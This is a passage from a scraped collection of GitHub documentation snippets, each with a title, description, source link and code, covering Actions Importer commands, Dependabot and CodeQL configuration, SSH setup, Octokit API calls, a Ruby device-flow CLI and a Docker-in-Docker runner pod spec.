https://github.com/github/docs/blob/main/content/codespaces/customizing-your-codespace/changing-the-shell-in-a-codespace.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n   \"terminal.integrated.profiles.OPERATING-SYSTEM\": {\n     \"SHELL\": {\n       \"path\": \"SHELL\"\n     }\n   }\n\n```\n\n----------------------------------------\n\nTITLE: Dry-Run Migration of a Jenkins Pipeline\nDESCRIPTION: This snippet shows how to perform a dry-run migration of a Jenkins pipeline to GitHub Actions using the `dry-run` command.  The `--source-url` parameter specifies the Jenkins job URL, and the `--output-dir` parameter specifies the directory to store the converted workflow files.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-jenkins-with-github-actions-importer.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer dry-run jenkins --source-url my-jenkins-project --output-dir tmp/dry-run\n```\n\n----------------------------------------\n\nTITLE: Setting GIT_SSH_COMMAND for SSH Key Specification\nDESCRIPTION: This command sets the `GIT_SSH_COMMAND` environment variable to specify an SSH command that uses a specific private key file for authentication. This allows you to use different SSH keys for different repositories when cloning. The `-o IdentitiesOnly=yes` option prevents ssh from trying other keys in your `~/.ssh` directory.\nSOURCE: https://github.com/github/docs/blob/main/content/account-and-profile/setting-up-and-managing-your-personal-account-on-github/managing-your-personal-account/managing-multiple-accounts.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nGIT_SSH_COMMAND='ssh -i PATH/TO/KEY/FILE -o IdentitiesOnly=yes' git clone git@github.com:OWNER/REPOSITORY\n```\n\n----------------------------------------\n\nTITLE: Initializing npm Project\nDESCRIPTION: This command initializes a new npm project in the current directory. The `-y` flag automatically accepts the default values for all configuration options, creating a `package.json` file.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/creating-a-javascript-action.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nnpm init -y\n```\n\n----------------------------------------\n\nTITLE: Audit with Configuration File for Azure DevOps Pipeline\nDESCRIPTION: This command audits an Azure DevOps pipeline using a specified YAML configuration file. It requires the output directory and the file path to the Azure DevOps configuration file. The configuration file specifies the source files to use for the audit.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-azure-devops-with-github-actions-importer.md#_snippet_11\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer audit azure-devops pipeline --output-dir ./output/ --config-file-path ./path/to/azure_devops/config.yml\n```\n\n----------------------------------------\n\nTITLE: Reset Organization Template Customizations\nDESCRIPTION: This JSON template resets the subject claims to the default format, effectively opting out of any organization-level customization policy. It includes the `repo` and `context` claims. The cloud provider OIDC configuration should be updated to require these claims.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect.md#_snippet_9\n\nLANGUAGE: json\nCODE:\n```\n{\n   \"include_claim_keys\": [\n       \"repo\",\n       \"context\"\n   ]\n}\n```\n\n----------------------------------------\n\nTITLE: Searching models by task on GitHub Marketplace\nDESCRIPTION: This snippet demonstrates how to search for models that support embedding tasks using the `task` qualifier.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/searching-on-github/searching-github-models.md#_snippet_9\n\nLANGUAGE: URL\nCODE:\n```\nhttps://github.com/search?q=task:embeddings&type=marketplace\n```\n\n----------------------------------------\n\nTITLE: Reusable Workflow Configuration (YAML)\nDESCRIPTION: This YAML configuration file specifies the target repository and ref for reusable workflows or composite actions.  It is generated by running `gh actions-importer audit gitlab --output-dir ./output/` . The file is passed to the migrate command with the `--config-file-path` argument.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_13\n\nLANGUAGE: YAML\nCODE:\n```\nreusable_workflows:\n  - name: my-reusable-workflow.yml\n    target_url: https://github.com/octo-org/octo-repo\n    ref: main\n```\n\n----------------------------------------\n\nTITLE: Configuring Target Branch for Pip and NPM with Dependabot in YAML\nDESCRIPTION: This YAML configuration shows how to configure Dependabot to raise pull requests against a non-default branch (develop) for pip version updates. It also configures npm dependency updates on Sundays. Note that using `target-branch` disables security updates for the specified package manager on the default branch and applies the configurations only to version updates. The configuration defines labels for pip and npm dependencies.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/dependabot-version-updates/customizing-dependabot-prs.md#_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\n# Specify a non-default branch for pull requests for pip\n\nversion: 2\nupdates:\n  - package-ecosystem: \"pip\"\n    directory: \"/\"\n    schedule:\n      interval: \"weekly\"\n    # Raise pull requests for version updates\n    # to pip against the `develop` branch\n    target-branch: \"develop\"\n    # Labels on pull requests for version updates only\n    labels:\n      - \"pip dependencies\"\n\n  - package-ecosystem: \"npm\"\n    directory: \"/\"\n    schedule:\n      interval: \"weekly\"\n      # Check for npm updates on Sundays\n      day: \"sunday\"\n    # Labels on pull requests for security and version updates\n    labels:\n      - \"npm dependencies\"\n```\n\n----------------------------------------\n\nTITLE: Extending CodeQL Coverage with Model Packs (YAML)\nDESCRIPTION: This snippet demonstrates how to extend CodeQL coverage by specifying CodeQL model packs. The `packs` entry within the `init` action is used to specify one or more packages and optionally their versions.  This enables the analysis to recognize libraries or frameworks not covered by standard queries. GITHUB_TOKEN is needed for accessing non-public packages.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/customizing-your-advanced-setup-for-code-scanning.md#_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\n- uses: {% data reusables.actions.action-codeql-action-init %}\n  with:\n    config-file: ./.github/codeql/codeql-config.yml\n    queries: security-extended\n    packs: my-company/my-java-queries@~7.8.9,my-repo/my-java-model-pack\n```\n\n----------------------------------------\n\nTITLE: Setting Minimum Host Requirements in devcontainer.json\nDESCRIPTION: This code snippet demonstrates how to set minimum host requirements (CPU, memory, and storage) for GitHub Codespaces machines within the `devcontainer.json` file. It ensures that only machines meeting these specifications can be used for the codespace, avoiding under-resourced environments. The example sets a minimum of 8 CPUs, 8GB of memory, and 32GB of storage.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/setting-up-your-project-for-codespaces/configuring-dev-containers/setting-a-minimum-specification-for-codespace-machines.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n   \"hostRequirements\": {\n      \"cpus\": 8,\n      \"memory\": \"8gb\",\n      \"storage\": \"32gb\"\n   }\n```\n\n----------------------------------------\n\nTITLE: Adding users to Copilot via API using GitHub Actions\nDESCRIPTION: This JavaScript code snippet demonstrates how to use the Octokit library within a GitHub Actions workflow to add users to a GitHub Copilot subscription for an organization. It utilizes the `POST /orgs/{org}/copilot/billing/selected_users` endpoint to add users based on the workflow trigger context. The `org` parameter is derived from the repository owner, and the `selected_usernames` array contains the login of the workflow sender.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/rolling-out-github-copilot-at-scale/setting-up-a-self-serve-process-for-github-copilot-licenses.md#_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst { Octokit } = require(\"@octokit/action\");\nconst octokit = new Octokit();\nconst response = await octokit.request('POST /orgs/{org}/copilot/billing/selected_users', {\n  org: context.repo.owner,\n  selected_usernames: [context.payload.sender.login],\n  headers: {\n    'X-GitHub-Api-Version': '2022-11-28'\n  }\n})\n```\n\n----------------------------------------\n\nTITLE: Accessing Paginated Response Data from Octokit\nDESCRIPTION: This snippet shows how to access data from a paginated response object, including the number of issues returned and the title of the first issue.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-ruby.md#_snippet_16\n\nLANGUAGE: ruby\nCODE:\n```\nresponse = octokit.paginate(\"GET /repos/{owner}/{repo}/issues\", owner: \"github\", repo: \"docs\", per_page: 100)\nputs \"#{response.data.length} issues were returned\"\nputs \"The title of the first issue is: #{response.data[0]['title']}\"\n```\n\n----------------------------------------\n\nTITLE: Ternary operator example - YAML\nDESCRIPTION: Illustrates the use of a ternary operator within an expression to conditionally set an environment variable in a GitHub Actions workflow.  The value is set based on whether the GitHub reference is 'refs/heads/main'.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/evaluate-expressions-in-workflows-and-actions.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nenv:\n  MY_ENV_VAR: ${{ github.ref == 'refs/heads/main' && 'value_for_main_branch' || 'value_for_other_branches' }}\n```\n\n----------------------------------------\n\nTITLE: Triggering workflow on merge_group events in YAML\nDESCRIPTION: This YAML snippet configures a GitHub workflow to trigger when a `merge_group` event occurs, specifically when the `checks_requested` activity type is initiated. The workflow is also configured to run on pull requests targeting the `main` branch. It uses the `on` keyword to specify the trigger events and their types.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_15\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  pull_request:\n    branches: [ \"main\" ]\n  merge_group:\n    types: [checks_requested]\n```\n\n----------------------------------------\n\nTITLE: NuGet: Configuring registries in dependabot.yml\nDESCRIPTION: This snippet shows how to configure both private and public NuGet feeds in the `dependabot.yml` file. This allows Dependabot to access both types of registries when updating NuGet packages.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/maintain-dependencies/removing-dependabot-access-to-public-registries.md#_snippet_12\n\nLANGUAGE: yaml\nCODE:\n```\nversion: 2\nregistries:\n  nuget-example:\n    type: nuget-feed\n    url: https://nuget.example.com/v3/index.json\n    username: ${{ secrets.USERNAME }}\n    password: ${{ secrets.PASSWORD }}\n  public:\n    type: nuget-feed\n    url: https://api.nuget.org/v3/index.json\nupdates:\n  - package-ecosystem: nuget\n    directory: \"/\"\n    registries: \"*\"\n    schedule:\n      interval: daily\n```\n\n----------------------------------------\n\nTITLE: Adding SSH key to ssh-agent - PowerShell\nDESCRIPTION: This command adds the specified SSH private key to the ssh-agent. It is executed in a non-elevated PowerShell window.  It requires that the ssh-agent is already running.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent.md#_snippet_8\n\nLANGUAGE: PowerShell\nCODE:\n```\nssh-add c:/Users/YOU/.ssh/id_ed25519\n```\n\n----------------------------------------\n\nTITLE: Publishing a CodeQL Pack\nDESCRIPTION: This snippet demonstrates how to publish a CodeQL pack to the GitHub Container Registry using the `codeql pack publish` command.  This command is executed in the root directory of the pack.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/publishing-and-using-codeql-packs.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql pack publish\n```\n\n----------------------------------------\n\nTITLE: Running a Dry-Run Migration for a Bamboo Build Plan\nDESCRIPTION: This command performs a dry-run migration of a Bamboo build plan to a GitHub Actions workflow. It creates output files in a specified directory but does not open a pull request. The `--plan-slug` parameter specifies the Bamboo plan's project and plan key.  The `--output-dir` parameter specifies the output directory for the converted workflow files and logs.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bamboo-with-github-actions-importer.md#_snippet_7\n\nLANGUAGE: Shell\nCODE:\n```\ngh actions-importer dry-run bamboo build --plan-slug :my_plan_slug --output-dir tmp/dry-run\n```\n\n----------------------------------------\n\nTITLE: Starting Organization Migration with GraphQL\nDESCRIPTION: This GraphQL mutation initiates the migration of a GitHub organization. It requires the source organization URL, the desired target organization name, the target enterprise ID, and access tokens for both source and target environments. The mutation returns the ID of the newly created organization migration.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-between-github-products/migrating-organizations-from-githubcom-to-github-enterprise-cloud.md#_snippet_1\n\nLANGUAGE: GraphQL\nCODE:\n```\nmutation startOrganizationMigration (\n  $sourceOrgUrl: URI!,\n  $targetOrgName: String!,\n  $targetEnterpriseId: ID!,\n  $sourceAccessToken: String!,\n\t$targetAccessToken: String!\n){\n  startOrganizationMigration( input: {\n    sourceOrgUrl: $sourceOrgUrl,\n    targetOrgName: $targetOrgName,\n    targetEnterpriseId: $targetEnterpriseId,\n    sourceAccessToken: $sourceAccessToken,\n\t\ttargetAccessToken: $targetAccessToken\n  }) {\n    orgMigration {\n      id\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Set Scope for Vulnerability Checks\nDESCRIPTION: This YAML snippet configures the dependency review action to fail builds if vulnerable dependencies are introduced in the development scope. It adds the `fail-on-scopes` option to specify the environment.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/supply-chain-security/understanding-your-software-supply-chain/customizing-your-dependency-review-action-configuration.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\n- name: 'Dependency Review'\n  uses: actions/dependency-review-action@v4\n  with:\n    fail-on-severity: moderate\n    deny-licenses: LGPL-2.0, BSD-2-Clause\n    fail-on-scopes: development\n```\n\n----------------------------------------\n\nTITLE: Referencing Synced Action in Workflow (uses)\nDESCRIPTION: This snippet demonstrates how to reference a synced action within a GitHub Actions workflow file. It uses the `uses` keyword, followed by the destination repository name and the desired version. Requires the action to be previously synced to the enterprise instance.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-github-actions-for-your-enterprise/managing-access-to-actions-from-githubcom/manually-syncing-actions-from-githubcom.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nuses: synced-actions/actions-stale@v1\n```\n\n----------------------------------------\n\nTITLE: Invalid Path Filter - YAML\nDESCRIPTION: This example demonstrates the incorrect syntax for specifying a path filter. The missing quotes around `**/README.md` will cause a YAML parsing error and prevent the workflow from running.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_39\n\nLANGUAGE: yaml\nCODE:\n```\n# Invalid - creates a parse error that\n# prevents your workflow from running.\npaths:\n  - **/README.md\n```\n\n----------------------------------------\n\nTITLE: Applying the configuration in administrative shell\nDESCRIPTION: This snippet demonstrates how to apply the configuration changes made in the administrative shell. It executes the `ghe-config-apply` command which applies all the configuration changes made using `ghe-config`. This step is crucial to activate the dependency graph.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-code-security/managing-supply-chain-security-for-your-enterprise/enabling-the-dependency-graph-for-your-enterprise.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nghe-config-apply\n```\n\n----------------------------------------\n\nTITLE: BankAccount Class Implementation in Python\nDESCRIPTION: This code defines the BankAccount class with deposit, withdraw, and get_balance methods. It takes an optional notification_system object as a dependency. The deposit and withdraw methods interact with the notification system, calling its notify method with appropriate messages when valid operations are performed. It raises ValueError for invalid inputs (negative or zero deposit/withdrawal amounts, withdrawals exceeding balance).\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/writing-tests-with-github-copilot.md#_snippet_4\n\nLANGUAGE: python\nCODE:\n```\nclass BankAccount:\n    def __init__(self, initial_balance=0, notification_system=None):\n        if initial_balance < 0:\n            raise ValueError(\"Initial balance cannot be negative.\")\n        self.balance = initial_balance\n        self.notification_system = notification_system\n\n    def deposit(self, amount):\n        if amount <= 0:\n            raise ValueError(\"Deposit amount must be positive.\")\n        self.balance += amount\n        if self.notification_system:\n            self.notification_system.notify(f\"Deposited {amount}, new balance: {self.balance}\")\n\n    def withdraw(self, amount):\n        if amount <= 0:\n            raise ValueError(\"Withdrawal amount must be positive.\")\n        if amount > self.balance:\n            raise ValueError(\"Cannot withdraw more than the current balance.\")\n        self.balance -= amount\n        \n        if self.notification_system:\n            self.notification_system.notify(f\"Withdrew {amount}, new balance: {self.balance}\")\n        \n    def get_balance(self):\n        return self.balance\n```\n\n----------------------------------------\n\nTITLE: Feature Flags Output Example (Shell)\nDESCRIPTION: Example output from the `gh actions-importer list-features` command, showing available feature flags, their descriptions, and required GHES versions.  This is useful to decide which features to enable or disable during the migration.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/supplemental-arguments-and-settings.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nAvailable feature flags:\n\nactions/cache (disabled):\n        Control usage of actions/cache inside of workflows. Outputs a comment if not enabled.\n        GitHub Enterprise Server >= ghes-3.5 required.\n\ncomposite-actions (enabled):\n        Minimizes resulting workflow complexity through the use of composite actions. See https://docs.github.com/en/actions/creating-actions/creating-a-composite-action for more information.\n        GitHub Enterprise Server >= ghes-3.4 required.\n\nreusable-workflows (disabled):\n        Avoid duplication by re-using existing workflows. See https://docs.github.com/en/actions/using-workflows/reusing-workflows for more information.\n        GitHub Enterprise Server >= ghes-3.4 required.\n\nworkflow-concurrency-option-allowed (enabled):\n        Allows the use of the `concurrency` option in workflows. See https://docs.github.com/en/actions/reference/workflow-syntax-for-github-actions#concurrency for more information.\n        GitHub Enterprise Server >= ghes-3.2 required.\n\nEnable features by passing --enable-features feature-1 feature-2\nDisable features by passing --disable-features feature-1 feature-2\n```\n\n----------------------------------------\n\nTITLE: Fetching User Info with GitHub Token in TypeScript\nDESCRIPTION: This TypeScript snippet demonstrates how to fetch user information from the GitHub API using the `X-GitHub-Token` provided in the request headers. It constructs an API request to the `/user` endpoint and uses the token for authorization. The function returns a JSON object containing user details.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/building-copilot-extensions/building-a-copilot-agent-for-your-copilot-extension/configuring-your-copilot-agent-to-communicate-with-github.md#_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\nasync function whoami(req) {\n  const response = await fetch(\n    // The {% data variables.product.github %} API endpoint for the authenticated user\n    \"https://api.github.com/user\",\n    {\n      headers: {\n        \"Authorization\": `Bearer ${req.headers.get(\"x-github-token\")}`\n      }\n    }\n  )\n\n  const user = await response.json()\n  return user\n}\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_JOB_TOKEN to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_JOB_TOKEN` to the GitHub Actions equivalent `${{ github.token }}`. The `${{ github.token }}` provides a token for the current job.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_28\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.token }}\n```\n\n----------------------------------------\n\nTITLE: Analyzing `run_container_step` Input JSON (Image)\nDESCRIPTION: This JSON represents an example input for the `run_container_step` command when using a Docker image. The `args` section specifies parameters such as the Docker image (`image`), entry point, working directory, environment variables, and mount volumes.  It includes both user and system mount volumes, and port mappings.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/customizing-the-containers-used-by-jobs.md#_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"command\": \"run_container_step\",\n  \"responseFile\": null,\n  \"state\": {\n    \"network\": \"example_network_53269bd575972817b43f7733536b200c\",\n    \"jobContainer\": \"82e8219701fe096a35941d869cf3d71af1d943b5d8bdd718857fb87ac3042480\",\n    \"serviceContainers\": {\n      \"redis\": \"60972d9aa486605e66b0dad4abb678dc3d9116f536579e418176eedb8abb9105\"\n    }\n  },\n  \"args\": {\n    \"image\": \"node:18\",\n    \"dockerfile\": null,\n    \"entryPointArgs\": [\"-f\", \"/dev/null\"],\n    \"entryPoint\": \"tail\",\n    \"workingDirectory\": \"/__w/octocat-test2/octocat-test2\",\n    \"createOptions\": \"--cpus 1\",\n    \"environmentVariables\": {\n      \"NODE_ENV\": \"development\"\n    },\n    \"prependPath\": [\"/foo/bar\", \"bar/foo\"],\n    \"userMountVolumes\": [\n      {\n        \"sourceVolumePath\": \"my_docker_volume\",\n        \"targetVolumePath\": \"/volume_mount\",\n        \"readOnly\": false\n      }\n    ],\n    \"systemMountVolumes\": [\n      {\n        \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work\",\n        \"targetVolumePath\": \"/__w\",\n        \"readOnly\": false\n      },\n      {\n        \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/externals\",\n        \"targetVolumePath\": \"/__e\",\n        \"readOnly\": true\n      },\n      {\n        \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work/_temp\",\n        \"targetVolumePath\": \"/__w/_temp\",\n        \"readOnly\": false\n      },\n      {\n        \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work/_actions\",\n        \"targetVolumePath\": \"/__w/_actions\",\n        \"readOnly\": false\n      },\n      {\n        \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work/_tool\",\n        \"targetVolumePath\": \"/__w/_tool\",\n        \"readOnly\": false\n      },\n      {\n        \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work/_temp/_github_home\",\n        \"targetVolumePath\": \"/github/home\",\n        \"readOnly\": false\n      },\n      {\n        \"sourceVolumePath\": \"/home/octocat/git/runner/_layout/_work/_temp/_github_workflow\",\n        \"targetVolumePath\": \"/github/workflow\",\n        \"readOnly\": false\n      }\n    ],\n    \"registry\": null,\n    \"portMappings\": { \"80\": \"801\" }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Full code example for CLI application in Ruby\nDESCRIPTION: This is a complete example of a Ruby CLI application implementing device flow authentication and a `whoami` command. It includes functions for device code requests, token polling, login, API request handling, and response parsing.  It utilizes the `net/http`, `json`, `uri`, and `fileutils` libraries. Replace `YOUR_CLIENT_ID` with the client ID of your GitHub App.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-cli-with-a-github-app.md#_snippet_20\n\nLANGUAGE: ruby\nCODE:\n```\n#!/usr/bin/env ruby\n\nrequire \"net/http\"\nrequire \"json\"\nrequire \"uri\"\nrequire \"fileutils\"\n\nCLIENT_ID=\"YOUR_CLIENT_ID\"\n\ndef help\n  puts \"usage: app_cli <login | whoami | help>\"\nend\n\ndef main\n  case ARGV[0]\n  when \"help\"\n    help\n  when \"login\"\n    login\n  when \"whoami\"\n    whoami\n  else\n    puts \"Unknown command #{ARGV[0]}\"\n  end\nend\n\ndef parse_response(response)\n  case response\n  when Net::HTTPOK, Net::HTTPCreated\n    JSON.parse(response.body)\n  when Net::HTTPUnauthorized\n    puts \"You are not authorized. Run the `login` command.\"\n    exit 1\n  else\n    puts response\n    puts response.body\n    exit 1\n  end\nend\n\ndef request_device_code\n  uri = URI(\"{% data variables.product.oauth_host_code %}/login/device/code\")\n  parameters = URI.encode_www_form(\"client_id\" => CLIENT_ID)\n  headers = {\"Accept\" => \"application/json\"}\n\n  response = Net::HTTP.post(uri, parameters, headers)\n  parse_response(response)\nend\n\ndef request_token(device_code)\n  uri = URI(\"{% data variables.product.oauth_host_code %}/login/oauth/access_token\")\n  parameters = URI.encode_www_form({\n    \"client_id\" => CLIENT_ID,\n    \"device_code\" => device_code,\n    \"grant_type\" => \"urn:ietf:params:oauth:grant-type:device_code\"\n  })\n  headers = {\"Accept\" => \"application/json\"}\n  response = Net::HTTP.post(uri, parameters, headers)\n  parse_response(response)\nend\n\ndef poll_for_token(device_code, interval)\n\n  loop do\n    response = request_token(device_code)\n    error, access_token = response.values_at(\"error\", \"access_token\")\n\n    if error\n      case error\n      when \"authorization_pending\"\n        # The user has not yet entered the code.\n        # Wait, then poll again.\n        sleep interval\n        next\n      when \"slow_down\"\n        # The app polled too fast.\n        # Wait for the interval plus 5 seconds, then poll again.\n        sleep interval + 5\n        next\n      when \"expired_token\"\n        # The `device_code` expired, and the process needs to restart.\n        puts \"The device code has expired. Please run `login` again.\"\n        exit 1\n      when \"access_denied\"\n        # The user cancelled the process. Stop polling.\n        puts \"Login cancelled by user.\"\n        exit 1\n      else\n        puts response\n        exit 1\n      end\n    end\n\n    File.write(\"./.token\", access_token)\n\n    # Set the file permissions so that only the file owner can read or modify the file\n    FileUtils.chmod(0600, \"./.token\")\n\n    break\n  end\nend\n\ndef login\n  verification_uri, user_code, device_code, interval = request_device_code.values_at(\"verification_uri\", \"user_code\", \"device_code\", \"interval\")\n\n  puts \"Please visit: #{verification_uri}\"\n  puts \"and enter code: #{user_code}\"\n\n  poll_for_token(device_code, interval)\n\n  puts \"Successfully authenticated!\"\nend\n\ndef whoami\n  uri = URI(\"{% data variables.product.rest_url %}/user\")\n\n  begin\n    token = File.read(\"./.token\").strip\n  rescue Errno::ENOENT => e\n    puts \"You are not authorized. Run the `login` command.\"\n    exit 1\n  end\n\n  response = Net::HTTP.start(uri.host, uri.port, use_ssl: true) do |http|\n    body = {\"access_token\" => token}.to_json\n    headers = {\"Accept\" => \"application/vnd.github+json\", \"Authorization\" => \"Bearer #{token}\"}\n\n    http.send_request(\"GET\", uri.path, body, headers)\n  end\n\n  parsed_response = parse_response(response)\n  puts \"You are #{parsed_response[\"login\"]}\"\nend\n\nmain\n```\n\n----------------------------------------\n\nTITLE: Granting Migrator Role with GitHub CLI\nDESCRIPTION: This code snippet demonstrates how to use the `gh bbs2gh grant-migrator-role` command to grant the migrator role to a user or team within a GitHub organization. It requires the GitHub CLI with the bbs2gh extension installed, a personal access token (PAT) with appropriate scopes, and the organization, actor (user or team name), and actor type (USER or TEAM) as parameters.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-from-bitbucket-server-to-github-enterprise-cloud/managing-access-for-a-migration-from-bitbucket-server.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngh bbs2gh grant-migrator-role --github-org ORGANIZATION --actor ACTOR --actor-type TYPE\n```\n\n----------------------------------------\n\nTITLE: Curl Request to GraphQL API with Global ID Header\nDESCRIPTION: This curl command demonstrates how to send a request to the GitHub GraphQL API with the `X-Github-Next-Global-ID` header set to `1`. This forces the API to return the new global node ID format for any object whose `id` field is requested. The request uses a bearer token for authentication and includes a GraphQL query in the request body to fetch a node by its ID.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/migrating-graphql-global-node-ids.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n$ curl \\\n  -H \"Authorization: Bearer $GITHUB_TOKEN\" \\\n  -H \"X-Github-Next-Global-ID: 1\" \\\n  https://api.github.com/graphql \\\n  -d '{ \"query\": \"{ node(id: \\\"MDQ6VXNlcjM0MDczMDM=\\\") { id } }\" }'\n```\n\n----------------------------------------\n\nTITLE: Defining Runner Pod Specification - YAML\nDESCRIPTION: This YAML snippet defines the pod specification for an actions runner. It includes init containers for setting up Docker-in-Docker, and containers for the runner and the dind service, with volume mounts for shared directories and sockets.  It specifies images, commands, environment variables, and security contexts for each container.  It also defines the volumes used by the containers.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller.md#_snippet_30\n\nLANGUAGE: YAML\nCODE:\n```\nspec:\n    initContainers:\n    - name: init-dind-externals\n      image: ghcr.io/actions/actions-runner:latest\n      command: [\"cp\", \"-r\", \"/home/runner/externals/.\", \"/home/runner/tmpDir/\"]\n      volumeMounts:\n        - name: dind-externals\n          mountPath: /home/runner/tmpDir\n    - name: init-dind-rootless\n      image: docker:dind-rootless\n      command:\n        - sh\n        - -c\n        - |\n          set -x\n          cp -a /etc/. /dind-etc/\n          echo 'runner:x:1001:1001:runner:/home/runner:/bin/ash' >> /dind-etc/passwd\n          echo 'runner:x:1001:' >> /dind-etc/group\n          echo 'runner:100000:65536' >> /dind-etc/subgid\n          echo 'runner:100000:65536' >> /dind-etc/subuid\n          chmod 755 /dind-etc;\n          chmod u=rwx,g=rx+s,o=rx /dind-home\n          chown 1001:1001 /dind-home\n      securityContext:\n        runAsUser: 0\n      volumeMounts:\n        - mountPath: /dind-etc\n          name: dind-etc\n        - mountPath: /dind-home\n          name: dind-home\n    containers:\n    - name: runner\n      image: ghcr.io/actions/actions-runner:latest\n      command: [\"/home/runner/run.sh\"]\n      env:\n        - name: DOCKER_HOST\n          value: unix:///run/user/1001/docker.sock\n      securityContext:\n        privileged: true\n        runAsUser: 1001\n        runAsGroup: 1001\n      volumeMounts:\n        - name: work\n          mountPath: /home/runner/_work\n        - name: dind-sock\n          mountPath: /run/user/1001\n    - name: dind\n      image: docker:dind-rootless\n      args:\n        - dockerd\n        - --host=unix:///run/user/1001/docker.sock\n      securityContext:\n        privileged: true\n        runAsUser: 1001\n        runAsGroup: 1001\n      volumeMounts:\n        - name: work\n          mountPath: /home/runner/_work\n        - name: dind-sock\n          mountPath: /run/user/1001\n        - name: dind-externals\n          mountPath: /home/runner/externals\n        - name: dind-etc\n          mountPath: /etc\n        - name: dind-home\n          mountPath: /home/runner\n    volumes:\n    - name: work\n      emptyDir: {}\n    - name: dind-externals\n      emptyDir: {}\n    - name: dind-sock\n      emptyDir: {}\n    - name: dind-etc\n      emptyDir: {}\n    - name: dind-home\n      emptyDir: {}\n```\n\n----------------------------------------\n\nTITLE: Auditing CircleCI Projects with CLI\nDESCRIPTION: This shell command audits all projects within a specified CircleCI organization using GitHub Actions Importer. It generates a report in the specified output directory summarizing the migration potential and complexity.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-circleci-with-github-actions-importer.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer audit circle-ci --output-dir tmp/audit\n```\n\n----------------------------------------\n\nTITLE: Running BankAccount Integration Tests in Bash\nDESCRIPTION: This command shows how to execute the integration tests for the BankAccount class from the command line using the Python unittest module. It runs the test suite defined in the 